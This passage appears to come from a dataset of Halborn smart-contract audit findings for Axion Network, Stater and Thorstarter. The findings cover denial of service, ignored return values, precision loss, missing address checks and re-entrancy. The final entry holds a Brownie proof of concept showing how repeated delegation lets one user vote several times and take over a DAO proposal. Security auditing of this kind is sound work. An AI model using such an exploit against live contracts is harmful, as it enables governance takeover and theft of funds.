thus re-entrancy would not benefit a hacker. - Listing 24: This would result in reminting the same stake, but removeStake is called first, the stake would not exist thus re-entrancy should not be a problem. 28 ",
        "labels": [
            "Halborn",
            "Axion_Network",
            "Severity: Low"
        ]
    },
    {
        "title": "MULTIPLE CALLS MAY LEADS TO DENIAL OF SERVICE(DOS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Axion_Network_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In contract StakeMinter.sol, StakeReminter.sol, and VentureCapital.sol multiple calls are executed in the same transaction. This call is executed following another call within the same transaction. It is possible that the call never gets executed if a prior call fails permanently and it may leads to DOS. This might be caused intentionally by a malicious user. Code Location: Listing 25: VentureCapital.sol (Lines 310) 303 304 305 306 307 308 309 310 311 312 313 314 315 316 function getTokenInterestEarned ( address accountAddress , address tokenAddress ) external view returns ( uint256 ) { } if ( isVcaRegistered [ accountAddress ] == false ) { return (( contracts . stakingV2 . getTotalSharesOf ( accountAddress ) * tokenPricePerShare [ tokenAddress ]) - contracts . stakingV2 . getDeductBalances ( accountAddress , tokenAddress )) / 1 e36 ; } return getTokenInterestEarnedInternal ( accountAddress , tokenAddress ); 29 Listing 26: StakeMinter.sol (Lines 100) 94 95 96 97 98 99 100 101 function convertToNft ( uint256 stakeId ) external { require ( contracts . stakeCustodian . removeStake ( msg . sender , stakeId ) , ' STAKE MINTER : Not owner of stake or already converted . ' ); contracts . stakeToken . mint ( msg . sender , stakeId ); // 120 k } Listing 27: StakeReminter.sol (Lines 46) 42 43 44 45 46 47 48 uint256 end = contracts . stakeManager . getStakeEnd ( stakeId ); require ( end != 0 && end <= block . timestamp , ' RESTAKER : Stake not mature or not set . '); uint256 payout = contracts . stakeBurner . externalBurnStake ( stakeId , msg . sender ); remintStakeInternal ( payout , topup , stakingDays ); Listing 28: StakeReminter.sol (Lines 80,81) 76 77 78 79 80 81 82 if ( topup != 0) { payout = payout + topup ; } contracts . token . burn ( msg . sender , payout ); // Burn the payout amount before restaking contracts . stakeMinter . externalStake ( payout , stakingDays , msg . sender ); } Risk Level: Likelihood - 1 Impact - 4 30 Recommendation: If possible, Refactor the code such that each transaction only executes one external call or make sure that all users can be trusted (i.e. theyre part of your own codebase). Remediation Plan: SOLVED: The Axion Network team removed the code in the new branch. 31 ",
        "labels": [
            "Halborn",
            "Axion_Network",
            "Severity: Low"
        ]
    },
    {
        "title": "EXTERNAL FUNCTION CALLS WITHIN LOOP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Axion_Network_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Calls inside a loop increase Gas usage or might lead to a denial-of-service attack. In one of the functions discovered there is a for loop on variable i that iterates up to the divTokens and v2DivTokens array length. If this integer is evaluated at extremely large numbers this can cause a DoS. Code Location: Listing 29: VentureCapital.sol (Lines 73,74,75,76) 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 function ensureIsVcaRegisteredInternal ( address staker ) internal { if ( isVcaRegistered [ staker ] == false ) { if ( contracts . stakingV2 . getIsVCARegistered ( staker ) == false ) { uint256 totalShares = contracts . stakingV2 . resolveTotalSharesOf ( staker ); totalSharesOf [ staker ] = totalShares ; contracts . stakeManager . addTotalVcaRegisteredShares ( totalShares ); for ( uint256 i = 0; i < divTokens . length () ; i ++) { deductBalances [ staker ][ divTokens . at ( i )] = ( totalShares * tokenPricePerShare [ divTokens . at ( i ) ]) . toInt256 () ; } } else { totalSharesOf [ staker ] = contracts . stakingV2 . getTotalSharesOf ( staker ); for ( uint256 i = 0; i < divTokens . length () ; i ++) { deductBalances [ staker ][ divTokens . at ( i )] = contracts . stakingV2 32 75 76 77 78 79 80 81 82 } } . getDeductBalances ( staker , divTokens . at (i ) ) . toInt256 () ; } } isVcaRegistered [ staker ] = true ; Listing 30: VentureCapital.sol (Lines 286,287,288) 282 283 284 285 286 287 288 289 290 address [] memory v2DivTokens = contracts . stakingV2 . getDivTokens () ; for ( uint256 i = 0; i < v2DivTokens . length ; i ++) { divTokens . add ( v2DivTokens [i ]) ; tokenPricePerShare [ v2DivTokens [ i ]] = contracts . stakingV2 . getTokenPricePerShare ( v2DivTokens [ i ] ); } } Risk Level: Likelihood - 2 Impact - 3 Recommendation: If possible, use pull over push strategy for external calls. Reference: External Calls Recommendation 33 Remediation Plan: SOLVED: The Axion Network team removed the code in the new branch. 34 ",
        "labels": [
            "Halborn",
            "Axion_Network",
            "Severity: Low"
        ]
    },
    {
        "title": "UNUSED RETURN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Axion_Network_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The return value of an external call is not stored in a local or state variable. In contract StakeBurner.sol, StakeMinter.sol, StakeUpgrader. sol, VentureCapital.sol, Accelerator.sol, and StakingV21.sol, there are instances where external methods are being called and return value are being ignored. Code Location: Listing 31: StakeBurner.sol (Lines 196) 195 196 197 198 199 // Add to stake custodian as the v1 or v2 stake is now a v3 stake that has been withdrawn contracts . stakeCustodian . addStake ( staker , sessionId ); return payout ; } Listing 32: StakeMinter.sol (Lines 84,85,86,87) 79 80 81 82 83 84 85 86 87 88 function stakeInternal ( uint256 amount , uint256 stakingDays , address staker ) internal { contracts . stakeCustodian . addStake ( staker , contracts . stakeManager . createStake ( staker , amount , stakingDays ) ); } Listing 33: StakeUpgrader.sol (Lines 112) 110 111 }) ); 35 112 113 } contracts . stakeCustodian . addStake ( msg . sender , sessionId ); Listing 34: VentureCapital.sol (Lines 253) 252 253 254 function addDivToken ( address tokenAddress ) external override onlyExternalCaller { divTokens . add ( tokenAddress ); } Listing 35: VentureCapital.sol (Lines 285) 284 285 286 287 288 289 290 for ( uint256 i = 0; i < v2DivTokens . length ; i ++) { divTokens . add ( v2DivTokens [i ]) ; tokenPricePerShare [ v2DivTokens [ i ]] = contracts . stakingV2 . getTokenPricePerShare ( v2DivTokens [ i ] ); } } Listing 36: Accelerator.sol (Lines 268) 266 267 268 269 /* * Check allowance */ if ( IERC20 ( _tokenInAddress ). allowance ( address ( this ) , uniswap ) < 2**255) { IERC20 ( _tokenInAddress ). approve ( uniswap , 2**255) ; } Listing 37: StakingV21.sol (Lines 118) 113 114 115 116 117 118 if ( divTokens . at ( i) != address (0 xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF )) { IERC20Upgradeable token = IERC20Upgradeable ( divTokens . at ( i )) ; token . transfer ( vcAuction , token . balanceOf ( address ( this )) ); } else { payable ( vcAuction ). transfer ( address ( this ). balance ) ; 36 119 } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Ensure that all the return values of the function calls are used. Add Return return value check to avoid unexpected crash of the contract. value check will help in handling the exceptions better way. Remediation Plan: PARTIALLY SOLVED: The Axion Network team solved the issue of Listing 32, and accepts the risk of Listing 34 and Listing 36. Further, Axion Network team claims that Listing 31, Listing 35 and Listing 31 only affects their backwards compatibility, issues listed without backwards compatibility do not apply. Backwards compatibility has been removed in the not-backwards branch. 37 ",
        "labels": [
            "Halborn",
            "Axion_Network",
            "Severity: Low"
        ]
    },
    {
        "title": "DIVIDE BEFORE MULTIPLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Axion_Network_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "As a result, the loss of Solidity integer division might truncate. precision can sometimes be avoided by multiplying before division, although the manual implementation of the precision/decimal calculation is being taken care of by the developer. In this audit, there are multiple instances found where division is being performed before multiplication operation in contract file. Code Location: Listing 38: BPD.sol (Lines 89) 88 89 90 for ( uint256 i = bpdInterval [0]; i < bpdInterval [1]; i ++) { bpdAmount += ( shares / bpdShares [ i ]) * ( uint256 ( bpdPools [ i ]) * 1 e8 ); // x 1 e8 since we have one decimal } Listing 39: StakeManager.sol (Lines 199,200,201,202) 119 120 121 122 addToGlobalTotals ( newAmount - ( stakeUpgrade . amount / 1 e12 ) * 1 e12 , newShares - ( stakeUpgrade . shares / 1 e12 ) * 1 e12 ); Listing 40: StakeManager.sol (Lines 240) 539 540 541 } uint256 shares = ( numerator * 1 e18 ) / denominator ; return ( shares / 1 e12 ) * 1 e12 ; 38 Listing 41: StakeManager.sol (Lines 528,529,530,537,538,539,540,541) 525 526 527 528 529 530 531 532 533 534 535 536 537 538 539 540 541 542 function updateShareRate ( uint256 _payout ) internal { uint256 currentTokenTotalSupply = contracts . token . totalSupply () ; // 718485214285714285714285714 uint256 growthFactor = ( _payout * 1 e18 ) / ( currentTokenTotalSupply + ( uint256 ( statFields . totalStakedAmount ) * 1 e12 ) + 1) ; // we calculate the total AXN supply as circulating + staked if ( settings . shareRateScalingFactor == 0) { // use a shareRateScalingFactor which can be set in order to tune the speed of shareRate increase settings . shareRateScalingFactor = 1 e18 ; } interestFields . shareRate = ( (( uint256 ( interestFields . shareRate ) * (1 e36 + ( uint256 ( settings . shareRateScalingFactor ) * growthFactor )) ) / 1 e36 ) ) } . toUint128 () ; // 1 e18 used for precision . Listing 42: Accelerator.sol (Lines 304,305,320) 303 304 305 306 307 308 309 310 311 312 313 314 // ** Add additional axion if stake length is greater then 1 year */ uint256 payout = (100 * _axionBought ) / splitAmounts [0]; payout = payout + ( payout * baseBonus ) / 100; if ( _days >= bonusStartDays && bought [ _currentDay ] < maxBoughtPerDay ) { // Get amount for sale left uint256 payoutWithBonus = maxBoughtPerDay - bought [ _currentDay ]; // Add to payout bought [ _currentDay ] += payout ; if ( payout > payoutWithBonus ) { uint256 payoutWithoutBonus = payout - payoutWithBonus ; payout = 39 315 316 317 318 319 320 321 322 323 324 325 ( payoutWithBonus + ( payoutWithBonus * (( _days / bonusStartDays ) + bonusStartPercent )) / 100) + payoutWithoutBonus ; } else { payout = payout + ( payout * (( _days / bonusStartDays ) + bonusStartPercent )) / 100; // multiply by percent divide by 100 } } else { // ** If not returned above add to bought and return payout . */ bought [ _currentDay ] += payout ; } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider doing multiplication operation before division to prevail precision in the values in non floating data type. It is recommended to use SafeMath.sol. Remediation Plan: NOT APPLICABLE: The Axion Network team accepts the risk of Listing 42 and claims that they remove precision to allow for their stakes to be a single word struct. Further, Axion Network team claims - Listing 38: BPD Shares have 0 decimal precision - Listing 39: Amount and shares have 6 decimal precision - Listing 40: Shares have 6 decimal precision - Listing 41: only affects their backwards compatibility, issues listed without backwards compatibility do not apply. Backwards compatibility has been removed in the not-backwards branch. 40 41 ",
        "labels": [
            "Halborn",
            "Axion_Network",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Axion_Network_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There are multiple instances found where Address validation is missing. Lack of zero address validation has been found when assigning user supplied address values to state variables directly. In Accelerator.sol contract function setRecipient lacks a zero-check on _recipient, function setToken lacks a zero-check on _token, function setVentureCapital lacks a zero-check on _ventureCapital, function setStaking lacks a zero-check on _staking, function setStakeManager lacks a zero-check on _stakeManager , and function startAddresses lacks a zero-check on _staking, _axion, In StakingV21.sol contract function _token, _uniswap and _recipient. transferTokens lacks zero address check on payable(vcAuction).transfer( address(this).balance). Code Location: Listing 43: Accelerator.sol (Lines 448) 447 448 449 function setRecipient ( address payable _recipient ) external onlyManager { recipient = _recipient ; } Listing 44: Accelerator.sol (Lines 462) 461 462 463 464 function setToken ( address _token ) external onlyManager { token = _token ; IVentureCapital ( ventureCapital ). addDivToken ( _token ); } Listing 45: Accelerator.sol (Lines 470) 469 function setVentureCapital ( address _ventureCapital ) external onlyManager { 42 470 471 } ventureCapital = _ventureCapital ; Listing 46: Accelerator.sol (Lines 477) 476 477 478 function setStaking ( address _staking ) external onlyManager { staking = _staking ; } Listing 47: Accelerator.sol (Lines 484) 484 485 486 function setStakeManager ( address _stakeManager ) external onlyManager { stakeManager = _stakeManager ; } Listing 48: Accelerator.sol (Lines 513,514,515,516,517) address _staking , address _axion , address _token , address payable _uniswap , address payable _recipient 506 function startAddresses ( 507 508 509 510 511 512 513 514 515 516 517 518 staking = _staking ; axion = _axion ; token = _token ; uniswap = _uniswap ; recipient = _recipient ; ) external onlyMigrator { } Listing 49: StakingV21.sol (Lines 118) 111 112 113 114 function transferTokens ( address vcAuction , address stakeManager ) external onlyMigrator { for ( uint8 i = 0; i < divTokens . length () ; i ++) { if ( divTokens . at ( i) != address (0 xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF )) { IERC20Upgradeable token = IERC20Upgradeable ( divTokens . at ( i )) ; 43 115 116 117 118 119 120 token . transfer ( vcAuction , token . balanceOf ( address ( this )) ); } else { payable ( vcAuction ). transfer ( address ( this ). balance ) ; } } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Although administrative restrictions are imposed to this function due to the OpenZeppelin RBAC it is better to add proper address validation when assigning a value to a variable from user supplied inputs. Remediation Plan: RISK ACCEPTED: The Axion Network team accepts the risk. 44 3.10 (HAL-10) USAGE OF BLOCK-TIMESTAMP - LOW ",
        "labels": [
            "Halborn",
            "Axion_Network",
            "Severity: Informational"
        ]
    },
    {
        "title": "OWNER CAN RENOUNCE OWNERSHIP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_LendingData_Smart_Contract_Audit_Report_Halborn_v1.1.pdf",
        "body": "The Owner of the contract is usually the account which deploys the con- tract. As a result, the Owner is able to perform some privileged actions. In LendingData.sol smart contract, the renounceOwnership function is used to renounce being Owner. Otherwise, if the ownership was not transferred before, the contract will never have an Owner, which is dangerous. Function: Recommendation: Its recommended that the Owner is not able to call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. 13 Remediation Plan: Solved: Stater team will use a multi-signature wallet for the deployment to the mainnet. ",
        "labels": [
            "Halborn",
            "Stater_LendingData",
            "Severity: High"
        ]
    },
    {
        "title": "IMPROPER ROLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_LendingData_Smart_Contract_Audit_Report_Halborn_v1.1.pdf",
        "body": "Implementing a valid access control policy is an essential step in main- taining the security of a smart-contract. All the features of the smart contract , such as add/remove roles and upgrade contracts are given by Access Control. For instance, Ownership is the most common form of Ac- cess Control. In other words, the owner of a contract (the account that deployed it by default) can do some administrative tasks on it. Addi- tional authorization levels are needed to implement the least privilege principle, also known as least-authority, which ensures only authorized processes, users, or programs can access the necessary resources or in- formation. The ownership role is useful in a simple system, but more complex projects require the use of more roles by using Role-based access control. There could be multiple roles such as manager, admin in contracts which use a proxy contract.In LendingData.sol contract, owner is the only one privileged role. Owner can transfer the contract ownership, call the following functions. In conclusion, owner role can do too many actions in LendingData smart contract. If the private key of the owner account is compromised and multi-signature was not implemented, the attacker can perform many actions such as transferring ownership or change NFT addresses without following the principle of least privilege. 14 Functions: Listing 1 1 function setDiscounts 2 function setGlobalVariables 3 function addGeyserAddress 4 function addNftTokenId 5 function transferOwnership 6 function promissoryExchange Risk Level: Likelihood - 4 Impact - 4 Recommendation: A white-listing should be applied for the access policies on the smart contracts. Access Control policies should be determined over each role and the access control policies should be prevented from having only one authority. Remediation Plan: Solved: Stater team will use a multi-signature wallet for the deployment to the mainnet. 15 ",
        "labels": [
            "Halborn",
            "Stater_LendingData",
            "Severity: High"
        ]
    },
    {
        "title": "LACK OF ADDRESS CONTROL ON THE FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_LendingData_Smart_Contract_Audit_Report_Halborn_v1.1.pdf",
        "body": "Address validation in contract LendingData.sol is missing. Lack of ad- dress validation has been found in the multiple functions. On the follow- ing functions, user supplied address values are assigned state variables directly. Code Location: LendingData.sol LendingData.sol Line #~447-452 16 LendingData.sol Line #~465-472 LendingData.sol Line #~479-481 Risk Level: Likelihood - 2 Impact - 2 17 Recommendation: Although administrative restrictions are imposed to this function it is better to add proper address validation when assigning a value to a variable from user supplied inputs. As a better solution, a white- listing/black-listing should be applied on the related functions. Listing 2 1 2 3 4 5 6 modifier validAddress ( address addr ) { require ( addr != 0 , \" Value can not be null \") ; require ( addr != address (0) , \" Address cannot be 0 x0 \") ; require ( addr != address ( this ) , \" Address cannot be contract address \") ; _; } Remediation Plan: Pending: Stater team will fix it in a future release. 18 ",
        "labels": [
            "Halborn",
            "Stater_LendingData",
            "Severity: Low"
        ]
    },
    {
        "title": "USAGE OF BLOCK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_LendingData_Smart_Contract_Audit_Report_Halborn_v1.1.pdf",
        "body": "The During a manual review, we noticed the use of block.timestamp. contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of block.timestamp creates a risk that time manipulation can be performed to manipulate price oracles. Miners can modify the timestamp by up to 900 seconds. Code Location: LendingData.sol Line #195-199 LendingData.sol Line #220 19 LendingData.sol Line #246 LendingData.sol Line #291-308 20 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: Solved: because their timescales are higher than 900 seconds. Stater team assumes that the use of block.timestamp is safe 21 ",
        "labels": [
            "Halborn",
            "Stater_LendingData",
            "Severity: Low"
        ]
    },
    {
        "title": "IGNORE RETURN VALUES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_LendingData_Smart_Contract_Audit_Report_Halborn_v1.1.pdf",
        "body": "The return value of an external call is not stored in a local or state variable. In contract LendingData.sol, there are few instances where ex- ternal methods are being called and return value(bool) are being ignored. Affected Functions: Listing 3 1 function createLoan 2 function approveLoan 3 function cancelLoan 4 function payLoan 5 function terminateLoan 6 function promissoryExchange 7 function setPromissoryPermissions 8 function setDiscounts 9 function setGlobalVariables 10 function addGeyserAddress 11 function addNftTokenId Risk Level: Likelihood - 2 Impact - 2 Recommendation: Add a return value check to avoid unexpected crash of the contract. Return value check will help in handling the exceptions better way. 22 Remediation Plan: Risk Accepted: Stater team considers that if they add returns value they could exceed the code length limit. 23 ",
        "labels": [
            "Halborn",
            "Stater_LendingData",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBLE RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_LendingData_Smart_Contract_Audit_Report_Halborn_v1.1.pdf",
        "body": "Calling external contracts is dangerous if some functions and variables are called after the external call. An attacker could use a malicious contract to perform a recursive call before calling function and take over the control flow. transfer function is executed without increasing the loanId value before. Thus, an attacker could perform a recursive call to execute malicious code. Code Location: LendingData.sol Line #~166-176 Risk Level: Likelihood - 1 Impact - 2 24 Recommendation: As possible, external calls should be at the end of the function in order to avoiding an attacker take over the control flow. In that case, increase loanId before call transfer function. Remediation Plan: Risk Accepted: Stater team considers appropriate the structure of the function but they will fix in a future release. 25 ",
        "labels": [
            "Halborn",
            "Stater_LendingData",
            "Severity: Informational"
        ]
    },
    {
        "title": "FOR LOOP OVER DYNAMIC ARRAY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_LendingData_Smart_Contract_Audit_Report_Halborn_v1.1.pdf",
        "body": "When smart contracts are deployed or functions inside them are called, the execution of these actions always requires a certain amount of gas, based on how much computation is needed to complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block cannot exceed the threshold. Programming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. Modifying an array of unknown size, that increases in size over time, can lead to such a Denial of Service condition. A situation in which the block gas limit can be an issue is in sending funds to an array of addresses. Even without any malicious intent, this can easily go wrong. Just by having too large an array of users to pay can max out the gas limit and prevent the transaction from ever succeeding. Code Location: LendingData.sol Line #~342-360 26 LendingData.sol Line #~367-372 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Actions that require looping across the entire data structure should be avoided. If you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions. Remediation Plan: Risk Accepted: Stater team considers appropriate the use of loops. 27 ",
        "labels": [
            "Halborn",
            "Stater_LendingData",
            "Severity: Informational"
        ]
    },
    {
        "title": "PRAGMA VERSION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_LendingData_Smart_Contract_Audit_Report_Halborn_v1.1.pdf",
        "body": "LendingData.sol contract uses one of the latest pragma version (0.7.4) which was released back in October 19, 2020. The latest pragma version is (0.8.3) was released in April 2021. Many pragma versions have been released, going from version 0.6.x to the recently released version 0.8.x. in just 6 months. Code Location: LendingData.sol Line #2 Risk Level: Likelihood - 1 Impact - 1 Recommendation: In the Solitidy Github repository, there is a json file listing the bugs reported for each compiler version. No bugs have been found in > 0.7.3 versions and very few in 0.7.0 -- 0.7.3. The latest stable version is Furthermore, pragma 0.6.12 is widely used by Solidity pragma 0.6.12. developers and has been extensively tested in many security audits. We recommend using at minimum the latest stable version. Reference: https://github.com/ethereum/solidity/blob/develop/docs/ bugs_by_version.json 28 Remediation Plan: Risk Accepted: Stater team considers appropriate the use of pragma 0.7.4 for the deployment to the mainnet. 29 3.9 STATIC ANALYSIS REPORT ",
        "labels": [
            "Halborn",
            "Stater_LendingData",
            "Severity: Informational"
        ]
    },
    {
        "title": "USER CAN VOTE MULTIPLE TIMES THROUGH DELEGATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Governance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The contract Voters.sol contains a function called delegate() which allows a user to delegate his voting power to another address. In the contract DAO.sol, there is a restriction that only allows a user to vote for a proposal once. This restriction can be bypassed by delegating the voting power into another address. Combining this vulnerability with the issue discribed in HAL02, an attacker would be able to take full control of the DAO.sol contract without needing a flash loan. Code Location: DAO.sol Listing 1: DAO.sol (Lines 185) 182 function _vote ( address voter , uint proposalId , uint optionId ) private { Proposal storage p = proposals [ proposalId ]; require ( block . timestamp < p . endAt , \" voting ended \" ); require ( proposalVotes [ proposalId ][ voter ] == 0 , \" already voted \" ); p. optionsVotes [ optionId ] = p . optionsVotes [ optionId ] + voters . votesAt ( voter , p . snapshotId ); proposalVotes [ proposalId ][ voter ] = optionId + 1; emit Voted ( proposalId , voter , optionId ); 183 184 185 186 187 188 189 } Voters.sol Listing 2: Voters.sol 159 function delegate ( address delegatee ) external { 160 161 162 UserInfo storage userInfo = _userInfos [ msg . sender ]; address currentDelegate = userInfo . delegate ; userInfo . delegate = delegatee ; 13 163 164 165 166 167 168 169 170 171 } _updateSnapshot ( _votesSnapshots [ currentDelegate ], votes ( currentDelegate )) ; _updateSnapshot ( _votesSnapshots [ delegatee ], votes ( delegatee )) ; uint amount = balanceOf ( msg . sender ); _votes [ currentDelegate ] -= amount ; _votes [ delegatee ] += amount ; emit DelegateChanged ( msg . sender , currentDelegate , delegatee ); Proof of Concept: 1. User1 has 49 voting power 2. User2 has 10 voting power, which means he would need 5 votes to beat User1 3. User2 creates a proposal 4. User1 votes to reject it 5. User2 votes to approve it (1st vote) 6. User2 delegates his voting power to Address3 7. Address3 votes to approve it (2nd vote) 8. Address3 delegates back to User2 his voting power 9. User2 delegates his voting power to Address4 10. Address4 votes to approve it (3rd vote) 11. Address4 delegates back to User2 his voting power 12. User2 delegates his voting power to Address5 13. Address5 votes to approve it (4th vote) 14. Address5 delegates back to User2 his voting power 15. User2 delegates his voting power to Address6 16. Address6 votes to approve it (5th vote) 17. Proposal is accepted and executed Listing 3: Proof of Concept using Brownie (Lines 94,97,100,105) 1 # Deploying test Token contracts 2 >>> accounts [0]. deploy ( XRuneToken ) 3 >>> accounts [0]. deploy ( OfferingToken ) 14 4 5 # Deploying contract Voters . sol - constructor ( address _owner , address _token , address _sushiLpToken ) 6 >>> accounts [0]. deploy ( Voters , accounts [0]. address , XRuneToken [0]. address , OfferingToken [0]. address ) 7 8 # Deploying contract DAO . sol - constructor ( address _voters , uint _minBalanceToPropose , uint _minPercentQuorum , uint _minVotingTime , uint _minExecutionDelay ) 9 >>> accounts [0]. deploy ( DAO , Voters [0]. address , 10 , 0, 0, 0) 10 11 # Adding DAO contract as a snapshotter of Voters . sol 12 >>> Voters [0]. toggleSnapshotter ( DAO [0]. address ) 13 14 # user1 49% of voting power 15 >>> user1 = accounts [1] 16 >>> XRuneToken [0]. transfer ( user1 . address , 49) 17 >>> XRuneToken [0]. approve ( Voters [0]. address , 49 , { ' from ': user1 }) 18 >>> Voters [0]. lock (49 , { ' from ': user1 }) 19 20 # user2 10% of voting power 21 >>> user2 = accounts [2] 22 >>> XRuneToken [0]. transfer ( user2 , 10) 23 >>> XRuneToken [0]. approve ( Voters [0]. address , 10 , { ' from ': user2 }) 24 >>> Voters [0]. lock (10 , { ' from ': user2 }) 25 26 # Voting power 27 >>> print (\" votes ( user1 ) -> \" + str ( Voters [0]. votes ( user1 )) ) 28 votes ( user1 ) -> 49 29 >>> print (\" votes ( user2 ) -> \" + str ( Voters [0]. votes ( user2 )) ) 30 votes ( user2 ) -> 10 31 32 # User2 creates a proposal that calls DAO . setMinBalanceToPropose (1337) 33 >>> encoded_setMinBalanceToPropose = DAO . signatures [' setMinBalanceToPropose '] + eth_abi . encode_abi ([ ' uint256 ' ,] , (1337 ,) ). hex () 34 >>> bytes_setMinBalanceToPropose = to_bytes ( encoded_setMinBalanceToPropose ,' bytes ') 35 >>> actionBytes = eth_abi . encode_abi ([ ' address ', 'uint ', ' bytes '] , ( DAO [0]. address , 0, bytes_setMinBalanceToPropose )) . hex () 36 >>> proposalID = DAO [0]. propose (\" Title \", \" Description \", 10000 , 100 , [\" For \", \" Against \"] , [[ actionBytes ], []] , { ' from ': user2 }) 37 >>> proposalID = proposalID . return_value 15 38 >>> print (\" ProposalID -> \" + str ( proposalID ) + \"\\ n \") 39 ProposalID -> 1 40 41 # User1 votes to reject the proposal . He has the 49% of the total voting power 42 >>> DAO [0]. vote ( proposalID , 1, { ' from ': user1 }) 43 44 # user2 votes to approve his own proposal . He only has 10% of the total voting power . So he would need 5 votes to beat user1 decision 45 46 # 1 st vote 47 >>> DAO [0]. vote ( proposalID , 0, { ' from ': user2 }) 48 49 # user2 delegates his voting power to accounts [3] and accounts [3] votes to approve the proposal 50 >>> Voters [0]. delegate ( accounts [3] , { ' from ': user2 }) 51 >>> print (\" accounts [3] - Voters [0]. votesAt ( accounts [3] ,1) -> \" + str ( Voters [0]. votesAt ( accounts [3] ,1) ) ) 52 accounts [3] - Voters [0]. votesAt ( accounts [3] ,1) -> 10 53 54 # 2 nd vote 55 >>> DAO [0]. vote ( proposalID , 0, { ' from ': accounts [3]}) 56 57 # accounts [3] delegates his voting power back to User2 58 >>> Voters [0]. delegate ( user2 , { ' from ': accounts [3]}) 59 60 # user2 delegates his voting power to accounts [4] and accounts [4] votes to approve the proposal 61 >>> Voters [0]. delegate ( accounts [4] , { ' from ': user2 }) 62 >>> print (\" accounts [4] - Voters [0]. votesAt ( accounts [4] ,1) -> \" + str ( Voters [0]. votesAt ( accounts [4] ,1) ) ) 63 accounts [4] - Voters [0]. votesAt ( accounts [4] ,1) -> 10 64 65 # 3 rd vote 66 >>> DAO [0]. vote ( proposalID , 0, { ' from ': accounts [4]}) 67 68 # accounts [4] delegates his voting power back to User2 69 >>> Voters [0]. delegate ( user2 , { ' from ': accounts [4]}) 70 71 # user2 delegates his voting power to accounts [5] and accounts [5] votes to approve the proposal 72 >>> Voters [0]. delegate ( accounts [5] , { ' from ': user2 }) 73 >>> print (\" accounts [5] - Voters [0]. votesAt ( accounts [5] ,1) -> \" + 16 str ( Voters [0]. votesAt ( accounts [5] ,1) ) ) 74 accounts [5] - Voters [0]. votesAt ( accounts [5] ,1) -> 10 75 76 # 4 th vote 77 >>> DAO [0]. vote ( proposalID , 0, { ' from ': accounts [5]}) 78 79 # accounts [5] delegates his voting power back to User2 80 >>> Voters [0]. delegate ( user2 , { ' from ': accounts [5]}) 81 82 # user2 delegates his voting power to accounts [6] and accounts [6] votes to approve the proposal 83 >>> Voters [0]. delegate ( accounts [6] , { ' from ': user2 }) 84 >>> print (\" accounts [6] - Voters [0]. votesAt ( accounts [6] ,1) -> \" + str ( Voters [0]. votesAt ( accounts [6] ,1) ) ) 85 accounts [6] - Voters [0]. votesAt ( accounts [6] ,1) -> 10 86 87 # 5 th vote 88 >>> DAO [0]. vote ( proposalID , 0, { ' from ': accounts [6]}) 89 90 # Sleep 24 hours so we can execute the proposal 91 >>> chain . sleep (86401) 92 93 >>> print (\" minBalanceToPropose before executing the proposal -> \" + str ( DAO [0]. minBalanceToPropose () ) + \"\\ n \") 94 minBalanceToPropose before executing the proposal -> 10 95 96 # accounts [6] executes the proposal 97 >>> DAO [0]. execute ( proposalID , { ' from ': accounts [6]}) 98 Transaction sent : 0 xc59618b9bda4804ef117a5c4ac2720 ... 99 Nonce : 1 100 Gas price : 0.0 gwei DAO . execute confirmed Gas limit : 6721975 Block : 13093650 Gas used : 76867 (1.14%) 101 102 < Transaction '0 xc59618b9bda4804ef117a5c4ac2720 ... ' > 103 104 >>> print (\" minBalanceToPropose after executing the proposal -> \" + str ( DAO [0]. minBalanceToPropose () )) 105 minBalanceToPropose after executing the proposal -> 1337 Risk Level: Likelihood - 5 17 Impact - 5 Recommendation: It is recommended checking if the delegator voted the 